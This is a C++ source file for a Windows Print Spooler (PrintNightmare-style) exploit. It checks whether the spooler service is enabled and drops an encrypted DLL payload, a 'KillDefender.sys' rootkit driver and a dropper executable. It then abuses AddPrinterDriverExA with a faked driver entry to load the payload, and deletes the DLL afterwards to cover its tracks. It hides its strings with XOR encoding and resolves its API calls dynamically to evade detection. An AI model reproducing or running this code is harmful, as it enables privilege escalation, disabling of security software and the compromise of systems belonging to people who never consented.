#include <iostream>
#include <Windows.h>
#include "MyPoC.h"
#include "MemOps.h"
#include "Random.h"
#include "StringCrypt.h"
#include "DynLibResolver.h"
#include "resource.h"
#include "PayloadDropper.h"

//#ifndef _DEBUG
//#define printf(fmt, ...)
//#endif

// Migrate to 64 bit machine

#define REG_SERVICE_START 0x00000002
#define APD_INSTALL_WARNED_DRIVER 0x8000
#define PAYLOAD_NAME_LEN 12
static BYTE INIT_RSRC_XOR_KEY_1[2] = { 0x7a, 0xe7 }; //7ae7
static BYTE INIT_RSRC_XOR_KEY_2[2] = { 0xda, 0xed }; //daed

static BYTE g_dll_payload[14] = {0xc1,0xc6,0xc8,0xc7,0xdb,0xc2,0xce,0xdd,0xca,0x81,0xcb,0xc3,0xc3,0}; //nightmare.dll
static BYTE g_droppy_name[12] = { 0xeb,0xdd,0xc0,0xdf,0xdf,0xca,0xdd,0x81,0xca,0xd7,0xca,0 }; //Dropper.exe 
static BYTE g_driver_name[11] = {0xe2,0xd6,0x8f,0xcb,0xdd,0xc6,0xd9,0xca,0xdd,0}; //My Driver
static BYTE g_enviroment[13] = {0xf8,0xc6,0xc1,0xcb,0xc0,0xd8,0xdc,0x8f,0xd7,0x99,0x9b,0}; //Windows x64
//SYSTEM\CurrentControlSet\Services\Spooler
static BYTE g_spooler_sv_key_path[45] = { 0xfc,0xf6,0xfc,0xfb,0xea,0xe2,0xf3,0xec,0xda,0xdd,0xdd,0xca,0xc1,0xdb,0xec,0xc0,0xc1,0xdb,0xdd,0xc0,0xc3,0xfc,0xca,0xdb,0xf3,0xfc,0xca,0xdd,0xd9,0xc6,0xcc,0xca,0xdc,0xf3,0xfc,0xdf,0xc0,0xc0,0xc3,0xca,0xdd,0};
static BYTE g_spooler_reg_val_name[6] = { 0xfc,0xdb,0xce,0xdd,0xdb,0}; //Start
static BYTE g_root_kit_file_name[17] = { 0xe4,0xc6,0xc3,0xc3,0xeb,0xca,0xc9,0xca,0xc1,0xcb,0xca,0xdd,0x81,0xdc,0xd6,0xdc,0 };//KillDefender.sys
static BYTE g_public_profile_path[17] = { 0xec,0x95,0xf3,0xfa,0xdc,0xca,0xdd,0xdc,0xf3,0xff,0xda,0xcd,0xc3,0xc6,0xcc,0xf3,0 };//C:\Users\Public\

static HANDLE hCurrentProcessHeap;

BOOL IsSpoolerVulnerable()
{
    HKEY hKey;

    char* p_dec_print_spooler_sv_key_path = XorDecryptStringEx(g_spooler_sv_key_path, sizeof(g_spooler_sv_key_path) + 1, NULL);
    if (((fp_RegOpenKeyA)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Advapi]),
        XorDecryptString(p_FunctionTable[FunctionEntry::_RegOpenKeyA])))(HKEY_LOCAL_MACHINE, p_dec_print_spooler_sv_key_path, &hKey) != ERROR_SUCCESS)
    {
        printf("[+] Failed to open registry\n");
        return FALSE;
    }
    
    char* p_reg_val_name = XorDecryptString(g_spooler_reg_val_name);
    DWORD dwType, dwValue, cbData;

    if (((fp_RegQueryValueExA)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Advapi]),
        XorDecryptString(p_FunctionTable[FunctionEntry::_RegQueryValueExA])))(hKey, p_reg_val_name, NULL, &dwType, (LPBYTE)&dwValue, &cbData) != ERROR_SUCCESS)
    {
        printf("[+] Failed to query registry\n");
        return FALSE;
    }
    //spooler enable ?
    if (dwValue != REG_SERVICE_START)
    {
        return FALSE;
    }

    free(p_dec_print_spooler_sv_key_path);
    free(p_reg_val_name);
    return TRUE;
}

int main()
{
    BOOL bRet;

    if (!InitFuncResolver()) 
    {
        return -1;
    }

    if (!IsSpoolerVulnerable())
    {
        printf("[+] Print Spooler Service not start\n");
        return -1;
    }

    hCurrentProcessHeap = ((fp_GetProcessHeap)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Kernel32]),
        XorDecryptString(p_FunctionTable[FunctionEntry::_GetProcessHeap])))();

    //Initialize payload name
    CHAR szPayloadName[50];
    size_t payload_name_len = PAYLOAD_NAME_LEN + 5; //add space for .dll and null-terminated

    mem_set((PBYTE)szPayloadName, sizeof(szPayloadName) , 0);
    GenerateRandomString(GetRandomSeed(), PAYLOAD_NAME_LEN, szPayloadName);

    mem_cpy((PBYTE)".dll", (PBYTE)(szPayloadName + str_len(szPayloadName)), 4);

    //get payload temp path
    CHAR* sDriverUpdatePath = (CHAR*)((fp_HeapAlloc)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Kernel32]),
        XorDecryptString(p_FunctionTable[FunctionEntry::_HeapAlloc])))(hCurrentProcessHeap, HEAP_ZERO_MEMORY, MAX_PATH + str_len(szPayloadName) + 1);

    if (sDriverUpdatePath == NULL)
    {
        printf("[-] Failed to alloc memory\n");
        return -1;
    }

    size_t cbTempPathLen = ((fp_GetTempPathA)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Kernel32]),
        XorDecryptString(p_FunctionTable[FunctionEntry::_GetTempPathA])))(MAX_PATH, sDriverUpdatePath);

    if (!cbTempPathLen) {
        printf("[-] Failed to get temp path\n");
        return -1;
    }
    // Set printer dll payload path
    mem_cpy((PBYTE)szPayloadName, (PBYTE)((PBYTE)sDriverUpdatePath + str_len(sDriverUpdatePath)), str_len(szPayloadName));

    Payload Payload;
    //Drop dll payload
    Payload.dwPayloadType   = _PayloadTypeResource;
    Payload.dwResourceId    = IDR_DATA1;
    Payload.szPayloadName   = szPayloadName;
    Payload.pKey            = INIT_RSRC_XOR_KEY_1;
    Payload.dwKeySize       = sizeof(INIT_RSRC_XOR_KEY_1);

    bRet = LoadPayload(&Payload, hCurrentProcessHeap) && DropPayload(&Payload, NULL, hCurrentProcessHeap);

    if (!bRet)
    {
        printf("[-] Failed to drop dll payload Error: %ld\n", GetLastError());
        return -1;
    }

    ((fp_HeapFree)(ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Kernel32]),
        XorDecryptString(p_FunctionTable[FunctionEntry::_HeapFree]))))(hCurrentProcessHeap, 0, Payload.pPayload);

    //Drop rootkit
    CHAR* pPublicProfilePath = XorDecryptString(g_public_profile_path);
    Payload.dwPayloadType = _PayloadTypeLocal;
    Payload.szPayloadName = XorDecryptStringEx(g_root_kit_file_name, sizeof(g_root_kit_file_name), (PBYTE)szPayloadName);

    bRet = LoadPayload(&Payload, hCurrentProcessHeap) && DropPayload(&Payload, pPublicProfilePath, hCurrentProcessHeap);

    if (!bRet)
    {
        printf("[-] Failed to drop rootkit payload Error: %ld\n", GetLastError());
        return -1;
    }

    ((fp_HeapFree)(ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Kernel32]),
        XorDecryptString(p_FunctionTable[FunctionEntry::_HeapFree]))))(hCurrentProcessHeap, 0, Payload.pPayload);
    
    // Drop Dropper.exe
    Payload.dwPayloadType       = _PayloadTypeResource;
    Payload.dwResourceId        = IDR_DATA2;
    Payload.szPayloadName       = XorDecryptStringEx(g_droppy_name, sizeof(g_droppy_name), (PBYTE)szPayloadName);
    Payload.pKey                = INIT_RSRC_XOR_KEY_2;
    Payload.dwKeySize           = sizeof(INIT_RSRC_XOR_KEY_2);

    bRet = LoadPayload(&Payload, hCurrentProcessHeap) && DropPayload(&Payload, pPublicProfilePath, hCurrentProcessHeap);

    if (!bRet)
    {
        printf("[-] Failed to drop dll payload Error: %ld\n", GetLastError());
        return -1;
    }

    ((fp_HeapFree)(ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Kernel32]),
        XorDecryptString(p_FunctionTable[FunctionEntry::_HeapFree]))))(hCurrentProcessHeap, 0, Payload.pPayload);

    free(pPublicProfilePath);

    char* decrypt_driver_name = XorDecryptString(g_driver_name);
    char* decrypt_env_name = XorDecryptString(g_enviroment);
    
    //prepare buffer for Printer driver
    DWORD cbByteNeeded, cbDriverInfoReturn;
    if (!((fp_EnumPrinterDriversA)(ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_WinSpool]),
        XorDecryptString(p_FunctionTable[FunctionEntry::_EnumPrinterDriversA]))))(NULL, decrypt_env_name, 2, NULL, 0, &cbByteNeeded, &cbDriverInfoReturn)) {
        printf("[+] Allocate %ld byte for printer driver data\n", cbByteNeeded);
    }

    DWORD cbByte;
    PBYTE pDriverListBuf = (PBYTE)((fp_HeapAlloc)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Kernel32]),
        XorDecryptString(p_FunctionTable[FunctionEntry::_HeapAlloc])))(hCurrentProcessHeap, HEAP_ZERO_MEMORY, cbByteNeeded);

    if (!((fp_EnumPrinterDriversA)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_WinSpool]),
        XorDecryptString(p_FunctionTable[FunctionEntry::_EnumPrinterDriversA])))(NULL, decrypt_env_name, 2, pDriverListBuf, cbByteNeeded, &cbByte, &cbDriverInfoReturn)) {
        printf("[-] Failed to get printer infomation error: %ld\n", GetLastError());
        return -1;
    }
    
    fp_AddPrinterDriverExA f_AddPrinterDriverExA = (fp_AddPrinterDriverExA)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_WinSpool]), 
        XorDecryptString(p_FunctionTable[FunctionEntry::_AddPrinterDriverExA]));
    
    if (!f_AddPrinterDriverExA) {
        printf("[-] Failed to get address of AddPrinterDriverExA error: %ld\n", GetLastError());
        return -1;
    }

    printf("[+] function AddPrinterDriverExA found at 0x%p\n", (PVOID)f_AddPrinterDriverExA);

    DWORD i = 0;
    DRIVER_INFO_2A* drivers = (DRIVER_INFO_2A*)pDriverListBuf;
    PBYTE pDriverBuffer = (PBYTE)((fp_HeapAlloc)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Kernel32]),
        XorDecryptString(p_FunctionTable[FunctionEntry::_HeapAlloc])))(hCurrentProcessHeap, HEAP_ZERO_MEMORY, sizeof(DRIVER_INFO_2A));

    // some driver path will not work so we have to iterate through the enumerated drivers in order to find the suitable driver path
    if (pDriverBuffer && cbDriverInfoReturn > 0 && pDriverListBuf)
    {
        while (i <= cbDriverInfoReturn) 
        {
            printf("[+] Using driver path %s\n", drivers[i].pDriverPath);
            DRIVER_INFO_2A* driver = (DRIVER_INFO_2A*)pDriverBuffer;

            //faking the infomation of legit driver by using the original driver from target system
            driver->cVersion = 3;
            driver->pConfigFile = sDriverUpdatePath;
            driver->pDataFile = sDriverUpdatePath;
            driver->pDriverPath = drivers[i].pDriverPath;
            driver->pEnvironment = decrypt_env_name;
            driver->pName = decrypt_driver_name;

            DWORD ret = ((f_AddPrinterDriverExA)(NULL,
                2,
                pDriverBuffer,
                APD_COPY_ALL_FILES | APD_COPY_FROM_DIRECTORY | APD_INSTALL_WARNED_DRIVER));

            printf("[!] AddPrinterDriverExA return %ld\n", ret);

            if (ret != 0) 
            {
                break;
            }

            printf("[!] AddPrinterDriverExA error: %ld try new driver\n", GetLastError());
            i++;
            continue;
        }
        ((fp_HeapFree)(ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Kernel32]),
            XorDecryptString(p_FunctionTable[FunctionEntry::_HeapFree]))))(hCurrentProcessHeap, 0, pDriverBuffer);
    }
    else
    {
        printf("[-] Failed to alloc drivers buffer error: %ld\n", GetLastError());
        return -1;
    }

    printf("[+] Cleaning payload\n");
    if (!((fp_DeleteFileA)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Kernel32]),
        XorDecryptString(p_FunctionTable[FunctionEntry::_DeleteFileA])))(sDriverUpdatePath)) {
        printf("[-] Failed to delete old payload error: %ld\n", GetLastError());
    }

    free(decrypt_driver_name);
    free(decrypt_env_name);
    ((fp_HeapFree)(ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Kernel32]),
        XorDecryptString(p_FunctionTable[FunctionEntry::_HeapFree]))))(hCurrentProcessHeap, 0, pDriverListBuf);
    return 0;
}
